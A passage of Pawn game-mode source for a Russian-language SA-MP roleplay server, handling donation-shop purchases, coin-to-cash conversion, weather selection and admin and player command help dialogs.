						  {FFFFFF}[2] Конвентировать в игровую валюту\t{F3FF02}200+ {FFFFFF}COINS\n\
						  {FFFFFF}[3] Снять предупреждение\t{F3FF02}400 {FFFFFF}COINS\n\
						  {FFFFFF}[4] Приобрести VIP BRONZE [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}1000 {FFFFFF}COINS\n\
						  {FFFFFF}[5] Приобрести {00FFEE}VIP{FFFFFF} SILVER [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}2000 {FFFFFF}COINS\n\
						  {FFFFFF}[6] Приобрести {F3FF02}VIP{FFFFFF} GOLD [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}3000 {FFFFFF}COINS\n\
						  {FFFFFF}[7] Вылечиться от наркозависимости\t{F3FF02}300 {FFFFFF}COINS\n\
						  {FFFFFF}[8] Приобрести ''Наркозависимость''\t{F3FF02}400 {FFFFFF}COINS\n\
						  {FFFFFF}[9] Приобрести ''Комплект лицензий''\t{F3FF02}200 {FFFFFF}COINS\n\
						  {FFFFFF}[10] Приобрести ''Навык стрельбы''\t{F3FF02}300 {FFFFFF}COINS\n\
						  {FFFFFF}[11] Приобрести ''Законопослушность''\t{F3FF02}600 {FFFFFF}COINS\n\
						  {FFFFFF}[12] Приобрести ''Навык дальнобойщика''\t{F3FF02}2000 {FFFFFF}COINS\n\
						  {FFFFFF}[13] Приобрести ''Навык таксиста''\t{F3FF02}500 {FFFFFF}COINS",
						  PlayerInfo[playerid][pName],
						  PlayerInfo[playerid][pDonateMoney],
						  PlayerInfo[playerid][pDonateAccount]);
						  ShowPlayerDialogEx(playerid,29322,DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Донат [ {AE443D}/viphelp{FFFFFF} ] | {AE443D}EVOLVE", string, "Выбрать", "Отмена");
					 }
					 case 12:
					 {
                          if(PlayerInfo[playerid][pDonateMoney] < 2000)
						  {
						      SCM(playerid,COLOR_GREY,"Недостаточно COINS для приобретения навыка дальнобойщика");
                              format(string, 2500, "{FFFFFF}Наименование\tСтоимость\n\
							  {FFFFFF}[0] Пользователь\t\t{AE443D}%s{FFFFFF}\n\
							  {FFFFFF}[1] {F3FF02}GOLD {FFFFFF}COINS\t\t{AE443D}%i/%i{FFFFFF}\n\
							  {FFFFFF}[2] Конвентировать в игровую валюту\t{F3FF02}200+ {FFFFFF}COINS\n\
							  {FFFFFF}[3] Снять предупреждение\t{F3FF02}400 {FFFFFF}COINS\n\
							  {FFFFFF}[4] Приобрести VIP BRONZE [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}1000 {FFFFFF}COINS\n\
							  {FFFFFF}[5] Приобрести {00FFEE}VIP{FFFFFF} SILVER [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}2000 {FFFFFF}COINS\n\
							  {FFFFFF}[6] Приобрести {F3FF02}VIP{FFFFFF} GOLD [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}3000 {FFFFFF}COINS\n\
							  {FFFFFF}[7] Вылечиться от наркозависимости\t{F3FF02}300 {FFFFFF}COINS\n\
							  {FFFFFF}[8] Приобрести ''Наркозависимость''\t{F3FF02}400 {FFFFFF}COINS\n\
							  {FFFFFF}[9] Приобрести ''Комплект лицензий''\t{F3FF02}200 {FFFFFF}COINS\n\
							  {FFFFFF}[10] Приобрести ''Навык стрельбы''\t{F3FF02}300 {FFFFFF}COINS\n\
							  {FFFFFF}[11] Приобрести ''Законопослушность''\t{F3FF02}600 {FFFFFF}COINS\n\
							  {FFFFFF}[12] Приобрести ''Навык дальнобойщика''\t{F3FF02}2000 {FFFFFF}COINS\n\
							  {FFFFFF}[13] Приобрести ''Навык таксиста''\t{F3FF02}500 {FFFFFF}COINS",
							  PlayerInfo[playerid][pName],
							  PlayerInfo[playerid][pDonateMoney],
							  PlayerInfo[playerid][pDonateAccount]);
							  ShowPlayerDialogEx(playerid,29322,DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Донат [ {AE443D}/viphelp{FFFFFF} ] | {AE443D}EVOLVE", string, "Выбрать", "Отмена");
							  return true;
						  }
						  PlayerInfo[playerid][pDonateAccount] += 2000;
						  PlayerInfo[playerid][pDonateMoney] -= 2000;
		  				  PlayerInfo[playerid][pDMgruz] = 50;
				          PlayerInfo[playerid][pDLevel] = 25;
						  SCM(playerid, COLOR_GREEN,"Вы приобрели навык дальнобойщика за {F3FF02}2000 {FFFFFF}COINS!");
						  mysql_format(DATABASE,QUERY,230, "UPDATE `"TABLE_ACCOUNTS"` SET pDMgruz = '%i', pDLevel = '%i', pDonateMoney = '%i', pDonateAccount = '%i' WHERE name = '%e'", PlayerInfo[playerid][pDMgruz], PlayerInfo[playerid][pDLevel], PlayerInfo[playerid][pDonateMoney], PlayerInfo[playerid][pDonateAccount], PlayerInfo[playerid][pName]);
                          mysql_function_query(DATABASE,QUERY,false,"","");
                          format(string, 2500, "{FFFFFF}Наименование\tСтоимость\n\
						  {FFFFFF}[0] Пользователь\t\t{AE443D}%s{FFFFFF}\n\
						  {FFFFFF}[1] {F3FF02}GOLD {FFFFFF}COINS\t\t{AE443D}%i/%i{FFFFFF}\n\
						  {FFFFFF}[2] Конвентировать в игровую валюту\t{F3FF02}200+ {FFFFFF}COINS\n\
						  {FFFFFF}[3] Снять предупреждение\t{F3FF02}400 {FFFFFF}COINS\n\
						  {FFFFFF}[4] Приобрести VIP BRONZE [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}1000 {FFFFFF}COINS\n\
						  {FFFFFF}[5] Приобрести {00FFEE}VIP{FFFFFF} SILVER [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}2000 {FFFFFF}COINS\n\
						  {FFFFFF}[6] Приобрести {F3FF02}VIP{FFFFFF} GOLD [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}3000 {FFFFFF}COINS\n\
						  {FFFFFF}[7] Вылечиться от наркозависимости\t{F3FF02}300 {FFFFFF}COINS\n\
						  {FFFFFF}[8] Приобрести ''Наркозависимость''\t{F3FF02}400 {FFFFFF}COINS\n\
						  {FFFFFF}[9] Приобрести ''Комплект лицензий''\t{F3FF02}200 {FFFFFF}COINS\n\
						  {FFFFFF}[10] Приобрести ''Навык стрельбы''\t{F3FF02}300 {FFFFFF}COINS\n\
						  {FFFFFF}[11] Приобрести ''Законопослушность''\t{F3FF02}600 {FFFFFF}COINS\n\
						  {FFFFFF}[12] Приобрести ''Навык дальнобойщика''\t{F3FF02}2000 {FFFFFF}COINS\n\
						  {FFFFFF}[13] Приобрести ''Навык таксиста''\t{F3FF02}500 {FFFFFF}COINS",
						  PlayerInfo[playerid][pName],
						  PlayerInfo[playerid][pDonateMoney],
						  PlayerInfo[playerid][pDonateAccount]);
						  ShowPlayerDialogEx(playerid,29322,DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Донат [ {AE443D}/viphelp{FFFFFF} ] | {AE443D}EVOLVE", string, "Выбрать", "Отмена");
					 }
					 case 13:
					 {
                          if(PlayerInfo[playerid][pDonateMoney] < 500)
						  {
						      SCM(playerid,COLOR_GREY,"Недостаточно COINS для приобретения навыка таксиста");
                              format(string, 2500, "{FFFFFF}Наименование\tСтоимость\n\
							  {FFFFFF}[0] Пользователь\t\t{AE443D}%s{FFFFFF}\n\
							  {FFFFFF}[1] {F3FF02}GOLD {FFFFFF}COINS\t\t{AE443D}%i/%i{FFFFFF}\n\
							  {FFFFFF}[2] Конвентировать в игровую валюту\t{F3FF02}200+ {FFFFFF}COINS\n\
							  {FFFFFF}[3] Снять предупреждение\t{F3FF02}400 {FFFFFF}COINS\n\
							  {FFFFFF}[4] Приобрести VIP BRONZE [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}1000 {FFFFFF}COINS\n\
							  {FFFFFF}[5] Приобрести {00FFEE}VIP{FFFFFF} SILVER [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}2000 {FFFFFF}COINS\n\
							  {FFFFFF}[6] Приобрести {F3FF02}VIP{FFFFFF} GOLD [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}3000 {FFFFFF}COINS\n\
							  {FFFFFF}[7] Вылечиться от наркозависимости\t{F3FF02}300 {FFFFFF}COINS\n\
							  {FFFFFF}[8] Приобрести ''Наркозависимость''\t{F3FF02}400 {FFFFFF}COINS\n\
							  {FFFFFF}[9] Приобрести ''Комплект лицензий''\t{F3FF02}200 {FFFFFF}COINS\n\
							  {FFFFFF}[10] Приобрести ''Навык стрельбы''\t{F3FF02}300 {FFFFFF}COINS\n\
							  {FFFFFF}[11] Приобрести ''Законопослушность''\t{F3FF02}600 {FFFFFF}COINS\n\
							  {FFFFFF}[12] Приобрести ''Навык дальнобойщика''\t{F3FF02}2000 {FFFFFF}COINS\n\
							  {FFFFFF}[13] Приобрести ''Навык таксиста''\t{F3FF02}500 {FFFFFF}COINS",
							  PlayerInfo[playerid][pName],
							  PlayerInfo[playerid][pDonateMoney],
							  PlayerInfo[playerid][pDonateAccount]);
							  ShowPlayerDialogEx(playerid,29322,DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Донат [ {AE443D}/viphelp{FFFFFF} ] | {AE443D}EVOLVE", string, "Выбрать", "Отмена");
							  return true;
						  }
						  PlayerInfo[playerid][pDonateAccount] += 500;
						  PlayerInfo[playerid][pDonateMoney] -= 500;
						  PlayerInfo[playerid][ptaxilvl] = 15;
						  SCM(playerid, COLOR_GREEN,"Вы приобрели навык таксиста за {F3FF02}500 {FFFFFF}COINS!");
						  mysql_format(DATABASE,QUERY,230, "UPDATE `"TABLE_ACCOUNTS"` SET ptaxilvl = '%i', pDonateMoney = '%i', pDonateMoney = '%i', pDonateAccount = '%i' WHERE name = '%e'", PlayerInfo[playerid][ptaxilvl], PlayerInfo[playerid][pDonateMoney], PlayerInfo[playerid][pDonateAccount], PlayerInfo[playerid][pName]);
                          mysql_function_query(DATABASE,QUERY,false,"","");
                          format(string, 2500, "{FFFFFF}Наименование\tСтоимость\n\
						  {FFFFFF}[0] Пользователь\t\t{AE443D}%s{FFFFFF}\n\
						  {FFFFFF}[1] {F3FF02}GOLD {FFFFFF}COINS\t\t{AE443D}%i/%i{FFFFFF}\n\
						  {FFFFFF}[2] Конвентировать в игровую валюту\t{F3FF02}200+ {FFFFFF}COINS\n\
						  {FFFFFF}[3] Снять предупреждение\t{F3FF02}400 {FFFFFF}COINS\n\
						  {FFFFFF}[4] Приобрести VIP BRONZE [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}1000 {FFFFFF}COINS\n\
						  {FFFFFF}[5] Приобрести {00FFEE}VIP{FFFFFF} SILVER [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}2000 {FFFFFF}COINS\n\
						  {FFFFFF}[6] Приобрести {F3FF02}VIP{FFFFFF} GOLD [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}3000 {FFFFFF}COINS\n\
						  {FFFFFF}[7] Вылечиться от наркозависимости\t{F3FF02}300 {FFFFFF}COINS\n\
						  {FFFFFF}[8] Приобрести ''Наркозависимость''\t{F3FF02}400 {FFFFFF}COINS\n\
						  {FFFFFF}[9] Приобрести ''Комплект лицензий''\t{F3FF02}200 {FFFFFF}COINS\n\
						  {FFFFFF}[10] Приобрести ''Навык стрельбы''\t{F3FF02}300 {FFFFFF}COINS\n\
						  {FFFFFF}[11] Приобрести ''Законопослушность''\t{F3FF02}600 {FFFFFF}COINS\n\
						  {FFFFFF}[12] Приобрести ''Навык дальнобойщика''\t{F3FF02}2000 {FFFFFF}COINS\n\
						  {FFFFFF}[13] Приобрести ''Навык таксиста''\t{F3FF02}500 {FFFFFF}COINS",
						  PlayerInfo[playerid][pName],
						  PlayerInfo[playerid][pDonateMoney],
						  PlayerInfo[playerid][pDonateAccount]);
						  ShowPlayerDialogEx(playerid,29322,DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Донат [ {AE443D}/viphelp{FFFFFF} ] | {AE443D}EVOLVE", string, "Выбрать", "Отмена");
					 }
				}
			}
		}
	case 29323:
		{
			if(response)
			{
			    switch(listitem)
				{
					 case 0:
					 {
	                      if(PlayerInfo[playerid][pDonateMoney] < 200) return SCM(playerid,COLOR_GREY,"Недостаточно COINS для конвертации");
	                      PlayerInfo[playerid][pDonateAccount] += 200;
						  PlayerInfo[playerid][pDonateMoney] -= 200;
	 				      PlayerInfo[playerid][pCash] += 500000;
	 				      GameTextForPlayer(playerid, "~g~+500.000$", 2000, 1);
					      SCM(playerid, COLOR_GREEN,"Вы приобрели 500.000$ за {F3FF02}200 {FFFFFF}COINS!");
		      	          mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pCash = '%i', pDonateMoney = '%i', pDonateAccount = '%i' WHERE name = '%e'", PlayerInfo[playerid][pCash], PlayerInfo[playerid][pDonateMoney], PlayerInfo[playerid][pDonateAccount], PlayerInfo[playerid][pName]);
	                      mysql_function_query(DATABASE,QUERY,false,"","");
					 }
					 case 1:
					 {
	                      if(PlayerInfo[playerid][pDonateMoney] < 400) return SCM(playerid,COLOR_GREY,"Недостаточно COINS для конвертации");
	                      PlayerInfo[playerid][pDonateAccount] += 400;
						  PlayerInfo[playerid][pDonateMoney] -= 400;
	 				      PlayerInfo[playerid][pCash] += 1000000;
	 				      GameTextForPlayer(playerid, "~g~+1.000.000$", 2000, 1);
					      SCM(playerid, COLOR_GREEN,"Вы приобрели 1.000.000$ за {F3FF02}400 {FFFFFF}COINS!");
		      	          mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pCash = '%i', pDonateMoney = '%i', pDonateAccount = '%i' WHERE name = '%e'", PlayerInfo[playerid][pCash], PlayerInfo[playerid][pDonateMoney], PlayerInfo[playerid][pDonateAccount], PlayerInfo[playerid][pName]);
	                      mysql_function_query(DATABASE,QUERY,false,"","");
					 }
					 case 2:
					 {
	                      if(PlayerInfo[playerid][pDonateMoney] < 1000) return SCM(playerid,COLOR_GREY,"Недостаточно COINS для конвертации");
	                      PlayerInfo[playerid][pDonateAccount] += 1000;
						  PlayerInfo[playerid][pDonateMoney] -= 1000;
	 				      PlayerInfo[playerid][pCash] += 2700000;
	 				      GameTextForPlayer(playerid, "~g~+2.700.000$", 2000, 1);
					      SCM(playerid, COLOR_GREEN,"Вы приобрели 2.700.000$ за {F3FF02}1000 {FFFFFF}COINS!");
		      	          mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pCash = '%i', pDonateMoney = '%i', pDonateAccount = '%i' WHERE name = '%e'", PlayerInfo[playerid][pCash], PlayerInfo[playerid][pDonateMoney], PlayerInfo[playerid][pDonateAccount], PlayerInfo[playerid][pName]);
	                      mysql_function_query(DATABASE,QUERY,false,"","");
					 }
					 case 3:
					 {
	                      if(PlayerInfo[playerid][pDonateMoney] < 2000) return SCM(playerid,COLOR_GREY,"Недостаточно COINS для конвертации");
	                      PlayerInfo[playerid][pDonateAccount] += 2000;
						  PlayerInfo[playerid][pDonateMoney] -= 2000;
	 				      PlayerInfo[playerid][pCash] += 5500000;
	 				      GameTextForPlayer(playerid, "~g~+5.500.000$", 2000, 1);
					      SCM(playerid, COLOR_GREEN,"Вы приобрели 5.500.000$ за {F3FF02}2000 {FFFFFF}COINS!");
		      	          mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pCash = '%i', pDonateMoney = '%i', pDonateAccount = '%i' WHERE name = '%e'", PlayerInfo[playerid][pCash], PlayerInfo[playerid][pDonateMoney], PlayerInfo[playerid][pDonateAccount], PlayerInfo[playerid][pName]);
	                      mysql_function_query(DATABASE,QUERY,false,"","");
					 }
					 case 4:
					 {
	                      if(PlayerInfo[playerid][pDonateMoney] < 3000) return SCM(playerid,COLOR_GREY,"Недостаточно COINS для конвертации");
	                      PlayerInfo[playerid][pDonateAccount] += 3000;
						  PlayerInfo[playerid][pDonateMoney] -= 3000;
	 				      PlayerInfo[playerid][pCash] += 8500000;
	 				      GameTextForPlayer(playerid, "~g~+8.500.000$", 2000, 1);
					      SCM(playerid, COLOR_GREEN,"Вы приобрели 8.500.000$ за {F3FF02}3000 {FFFFFF}COINS!");
		      	          mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pCash = '%i', pDonateMoney = '%i', pDonateAccount = '%i' WHERE name = '%e'", PlayerInfo[playerid][pCash], PlayerInfo[playerid][pDonateMoney], PlayerInfo[playerid][pDonateAccount], PlayerInfo[playerid][pName]);
	                      mysql_function_query(DATABASE,QUERY,false,"","");
					 }
					 case 5:
					 {
	                      if(PlayerInfo[playerid][pDonateMoney] < 4000) return SCM(playerid,COLOR_GREY,"Недостаточно COINS для конвертации");
	                      PlayerInfo[playerid][pDonateAccount] += 4000;
						  PlayerInfo[playerid][pDonateMoney] -= 4000;
	 				      PlayerInfo[playerid][pCash] += 12000000;
	 				      GameTextForPlayer(playerid, "~g~+12.000.000$", 2000, 1);
					      SCM(playerid, COLOR_GREEN,"Вы приобрели 12.000.000$ за {F3FF02}4000 {FFFFFF}COINS!");
		      	          mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pCash = '%i', pDonateMoney = '%i', pDonateAccount = '%i' WHERE name = '%e'", PlayerInfo[playerid][pCash], PlayerInfo[playerid][pDonateMoney], PlayerInfo[playerid][pDonateAccount], PlayerInfo[playerid][pName]);
	                      mysql_function_query(DATABASE,QUERY,false,"","");
					 }
					 case 6:
					 {
	                      if(PlayerInfo[playerid][pDonateMoney] < 8000) return SCM(playerid,COLOR_GREY,"Недостаточно COINS для конвертации");
	                      PlayerInfo[playerid][pDonateAccount] += 8000;
						  PlayerInfo[playerid][pDonateMoney] -= 8000;
	 				      PlayerInfo[playerid][pCash] += 26000000;
	 				      GameTextForPlayer(playerid, "~g~+26.000.000$", 2000, 1);
					      SCM(playerid, COLOR_GREEN,"Вы приобрели 26.000.000$ за {F3FF02}8000 {FFFFFF}COINS!");
		      	          mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pCash = '%i', pDonateMoney = '%i', pDonateAccount = '%i' WHERE name = '%e'", PlayerInfo[playerid][pCash], PlayerInfo[playerid][pDonateMoney], PlayerInfo[playerid][pDonateAccount], PlayerInfo[playerid][pName]);
	                      mysql_function_query(DATABASE,QUERY,false,"","");
					 }
					 case 7:
					 {
	                      if(PlayerInfo[playerid][pDonateMoney] < 16000) return SCM(playerid,COLOR_GREY,"Недостаточно COINS для конвертации");
	                      PlayerInfo[playerid][pDonateAccount] += 16000;
						  PlayerInfo[playerid][pDonateMoney] -= 16000;
	 				      PlayerInfo[playerid][pCash] += 55000000;
	 				      GameTextForPlayer(playerid, "~g~+55.000.000$", 2000, 1);
					      SCM(playerid, COLOR_GREEN,"Вы приобрели 55.000.000$ за {F3FF02}16000 {FFFFFF}COINS!");
		      	          mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pCash = '%i', pDonateMoney = '%i', pDonateAccount = '%i' WHERE name = '%e'", PlayerInfo[playerid][pCash], PlayerInfo[playerid][pDonateMoney], PlayerInfo[playerid][pDonateAccount], PlayerInfo[playerid][pName]);
	                      mysql_function_query(DATABASE,QUERY,false,"","");
					 }
				}
			}
			else return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/donate");
		}
	case 20012:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0: CallLocalFunction("OnPlayerCommandText", "is", playerid, "/ahelp");
			case 1: CallLocalFunction("OnPlayerCommandText", "is", playerid, "/paint");
			case 2: ShowPlayerDialogEx(playerid,4385,DIALOG_STYLE_LIST, "{FFFFFF}Список погоды", "{FFFFFF}[1]- Солнечная погода\n[2]- Очень солнечная погода\n[3]- Гроза\n[4]- Пасмурно и туман\n[5]- Хмурая и дождливая\n[6]- Песчаная буря \n[7]- Туманный и зеленоватый\n[8]- В красках бледного Апельсина\n[9]- Свежая в синих красках \n[10]- Туманно и серо \n[11]- Темный неясный коричневый \n[12]- Розовое небо", "Выбрать", "Отмена");
			case 3:
				{
					new playersip[32];
					new s[128];
					new stringus[128];
					new countmute = 0;
					foreach(i)
					{
						GetPlayerIp(i,playersip,sizeof(playersip));
						if(!strcmp(playersip, playersip))
						{
							new num_players_on_ip = GetNumberThisIP(playersip);
							if(num_players_on_ip > 1)
							{
								format(stringus, 256, " [%i] %s | IP %s", i,Name(i),playersip);
								SCM(playerid, -1, stringus);
								countmute++;
							}
							if(countmute == 0) ShowPlayerDialogEx(playerid, 2963, DIALOG_STYLE_MSGBOX, "{FFFFFF}Одинаковый IP-адрес", "{FFFFFF}В данный момент, нету игроков с одинаковым IP адресом.", "Назад", "");
						}
					}
					format(string, 256, "{FFA500}[IP MANS]{FFFFFF} В данный момент с одинаковым IP игроков: {FFA500}%i!", countmute);
					SCM(playerid, COLOR_LIGHTBLUE, string);
					return ShowPlayerDialogEx(playerid, 1331, DIALOG_STYLE_MSGBOX, "{FFFFFF}Игроки с IP адресами:",s,"OK","");
				}
			case 4: CallLocalFunction("OnPlayerCommandText", "is", playerid, "/warnmans");
			case 5: CallLocalFunction("OnPlayerCommandText", "is", playerid, "/mutelist");
			case 6: CallLocalFunction("OnPlayerCommandText", "is", playerid, "/vipmans");
			case 7: CallLocalFunction("OnPlayerCommandText", "is", playerid, "/abalance");
			}
		}
	case 4385:// ID диалога
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0: SetWeather(10),SCM(playerid, COLOR_NEWS, " Погода изменена!");
			case 1: SetWeather(11),SCM(playerid, COLOR_NEWS, " Погода изменена!");
			case 2: SetWeather(8),SCM(playerid, COLOR_NEWS, " Погода изменена!");
			case 3: SetWeather(9),SCM(playerid, COLOR_NEWS, " Погода изменена!");
			case 4: SetWeather(14),SCM(playerid, COLOR_NEWS, " Погода изменена!");
			case 5: SetWeather(19),SCM(playerid, COLOR_NEWS, " Погода изменена!");
			case 6: SetWeather(20),SCM(playerid, COLOR_NEWS, " Погода изменена!");
			case 7: SetWeather(23),SCM(playerid, COLOR_NEWS, " Погода изменена!");
			case 8: SetWeather(27),SCM(playerid, COLOR_NEWS, " Погода изменена!");
			case 9: SetWeather(30),SCM(playerid, COLOR_NEWS, " Погода изменена!");
			case 10: SetWeather(33),SCM(playerid, COLOR_NEWS, " Погода изменена!");
			case 11: SetWeather(-1337),SCM(playerid, COLOR_NEWS, " Погода изменена!");
			}
		}
	case 20011:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0:
				{
					SCM(playerid,0x83BFBFAA, "<1> /(a)dmin  /pm  /givecopkeys  /atazer /hi /hp /mutelist /getskill");
					SCM(playerid,0x83BFBFAA, "<1> /getstats /fid  /ajob  /ram  /kick  /mute /alock /aad /admins /ahelp");
					SCM(playerid,0x83BFBFAA, "<1> /togphone  /o  /unjail  /jail  /tjail /atipster /whonear /gmap /agun");
				}
			case 1:
				{
					if(PlayerInfo[playerid][pAdmin] >= 2)
					{
						SCM(playerid,0x83BFBFAA, "<2> /spcar  /spwcar  /sduty  /gm  /re  /ban  /warn  /amembers");
						SCM(playerid,0x83BFBFAA, "<2> /iwep  /goto  /setskin /take /prison /banip /tp");
					}
					else return SCM(playerid,COLOR_GREY," У вас недостаточно прав");
				}
			case 2:
				{
					if(PlayerInfo[playerid][pAdmin] >= 3)
					{
						SCM(playerid,0x83BFBFAA, "<3> /gethere /mark  /gotomark /awarehouse /atune");
						SCM(playerid,0x83BFBFAA, "<3> /slap  /freeze  /unfreeze /spcars /geton /givemf");
					}
					else return SCM(playerid,COLOR_GREY," У вас недостаточно прав");
				}
			case 3:
				{
					if(PlayerInfo[playerid][pAdmin] >= 4)
					{
						SCM(playerid,0x83BFBFAA, "<4> /settime  /weather  /noooc  /olimit  /sp  /skick");
						SCM(playerid,0x83BFBFAA, "<4> /iban  /ioffban  /offban  /offwarn  /sban  /auninvite");
						SCM(playerid,0x83BFBFAA, "<4> /geoinfo  /agetip  /pgetip  /apgetip  /unbanip  /setnik /spveh");
						SCM(playerid,0x83BFBFAA, "<4> /agetstats  /farm  /farmstats  /spveh  /getleader /setsatiety");
					}
					else return SCM(playerid,COLOR_GREY," У вас недостаточно прав");
				}
			case 4:
				{
					if(PlayerInfo[playerid][pAdmin] >= 5)
					{
						SCM(playerid,0x83BFBFAA, "<5> /makeleader  /givegun  /veh  /delcar  /sethp /fixveh  /fixvehs");
						SCM(playerid,0x83BFBFAA, "<5> /bantime  /unban  /arace  /paint /apanel /offuninvite  /offmembers");
						SCM(playerid,0x83BFBFAA, "<5> /hbject  /hbjectid  /setcasinoowner  /warnmans  /vipmans  /setsupport");
						SCM(playerid,0x83BFBFAA, "<5> /createvote /addvote /votelist /stopvote /actor /delactor /takegun");
					}
					else return SCM(playerid,COLOR_GREY," У вас недостаточно прав");
				}
			case 5:
				{
					if(PlayerInfo[playerid][pAdmin] >= 6)
					{
						SCM(playerid,0x83BFBFAA, "<6> /amusic  /obj  /object  /dobject  /eobject  /attach  /delattach /admmenu");
						SCM(playerid,0x83BFBFAA, "<6> /setspa  /getschet  /setarm  /gzcolor  /getobjectpos /splist /spmenu");
					}
					else return SCM(playerid,COLOR_GREY," У вас недостаточно прав");
				}
			case 6:
				{
					if(PlayerInfo[playerid][pAdmin] >= 7)
					{
						SCM(playerid,0x83BFBFAA, "<7> /addhouse  /sethousepos  /sethousecarpos  /setklass  /setcost");
						SCM(playerid,0x83BFBFAA, "<7> /setschet  /setkvartpos  /setkvartcarpos  /asellhouse /house");
						SCM(playerid,0x83BFBFAA, "<7> /biz  /setbcost  /addcbar  /setmats  /gotocar  /chat  /gm [id]");
						SCM(playerid,0x83BFBFAA, "<7> /agiverank  /agl  /cc  /forceskin  /unwarn  /booston  /boostoff");
						SCM(playerid,0x83BFBFAA, "<7> /delaccount  /setskill /setgrating  /alevel");
					}
					else return SCM(playerid,COLOR_GREY," У вас недостаточно прав");
				}


			case 7:
				{
					if(PlayerInfo[playerid][pAdmin] >= 8)
					{
						SCM(playerid,0x83BFBFAA, "<8> /unlockallkvart  /clearreconnect  /setallbizint  /getcampos  /setbproducts");
						SCM(playerid,0x83BFBFAA, "<8> /setbizbar  /setallbizworld  /setbizexit  /addstall  /addatm /addsbizz");
						SCM(playerid,0x83BFBFAA, "<8> /addeat  /addpizza  /addshop  /saveall  /asellbiz /restart /pcmd");
					}
					else return SCM(playerid,COLOR_GREY," У вас недостаточно прав");
				}


			case 8:
				{
					if(PlayerInfo[playerid][pAdmin] >= 9)
					{
						SCM(playerid,0x83BFBFAA, "<9> /payday  /setstat  /setstatcar  /reloadbans /edit  /offip  /smson");
                        SCM(playerid,0x83BFBFAA, "<9> /podeezd  /kvartira  /podcrt  /podcreate  /addmoderation  /addsupport");
                        SCM(playerid,0x83BFBFAA, "<9> /addkvarts - добавить квартиры на весь этаж  /spmenu, /admmenu - расширены");
					}
					else return SCM(playerid,COLOR_GREY," У вас недостаточно прав");
				}

			case 9:
				{
					if(PlayerInfo[playerid][pAdmin] >= 10)
					{
						SCM(playerid,0x83BFBFAA, "<> /setplayerskin  /rr  /money  /givemoney  /ServerBonus /givedonate");

					}
					else return SCM(playerid,COLOR_GREY," У вас недостаточно прав");
				}
			}
		}
	case 10025:
		{
			if(!response) return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/mm");
			switch(listitem)
			{
			case 0: ShowPlayerDialogEx(playerid,1012,DIALOG_STYLE_INPUT, "Поиск команд", "Введите интересующую Вас команду, и получите её описание", "Готово", "Отмена");
			case 1:
				{
					SCM(playerid,COLOR_CMD," <> /time /heal /id /ids /setsex /gps /healaddict");
					SCM(playerid,COLOR_CMD," <> /instructors /divorce /propose /witness /deliver");
					SCM(playerid,COLOR_CMD," <> /drink /music /colorlist /myskill /pdd");
					SCM(playerid,COLOR_CMD," <> /sell /busdrivers /eat /licenses /ratingnews");
					SCM(playerid,COLOR_CMD," <> /showlicenses /get /cancel /accept /animlist");
					SCM(playerid,COLOR_CMD," <> /eject /quitjob /buy /pay");
					SCM(playerid,COLOR_CMD," <> /usedrugs /radio /quest");
					return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/mm");
				}
			case 2:
				{
					SCM(playerid,COLOR_CMD," <> /(o)oc - Глобальный чат");
					SCM(playerid,COLOR_CMD," <> /(ad)vertise - Объявления");
					SCM(playerid,COLOR_CMD," <> /(gov)ernment - Государственные новости");
					SCM(playerid,COLOR_CMD," <> /(f)amily - Чат организации");
					SCM(playerid,COLOR_CMD," <> /(s)hout - Крик");
					SCM(playerid,COLOR_CMD," <> /(m)egaphone - Мегафон на полицейских машинах");
					SCM(playerid,COLOR_CMD," <> /(r)adio - Чат государственных организаций (Полиция/ФБР и т.д.)");
					SCM(playerid,COLOR_CMD," <> /(d)epartments - Общий чат государственных организаций");
					SCM(playerid,COLOR_CMD," <> /me - Действие (Имя_Фамилия пожал руку)");
					return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/mm");
				}
			case 3:
				{
					SCM(playerid,COLOR_CMD," <> /(c)all - Позвонить (Номер телефона можно узнать через /number)");
					SCM(playerid,COLOR_CMD," <> /sms - Отправить СМС сообщение");
					SCM(playerid,COLOR_CMD," <> /(p)ickup - Ответить на звонок");
					SCM(playerid,COLOR_CMD," <> /(h)angup - Завершить телефонный разговор");
					SCM(playerid,COLOR_CMD," <> /directory /number /togphone");
					return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/mm");
				}
			case 4:
				{
					SCM(playerid,COLOR_CMD," <> /withdraw - Снять деньги со счёта");
					SCM(playerid,COLOR_CMD," <> /bank - Положить деньги на счёт");
					SCM(playerid,COLOR_CMD," <> /balance - Узнать баланс счёта");
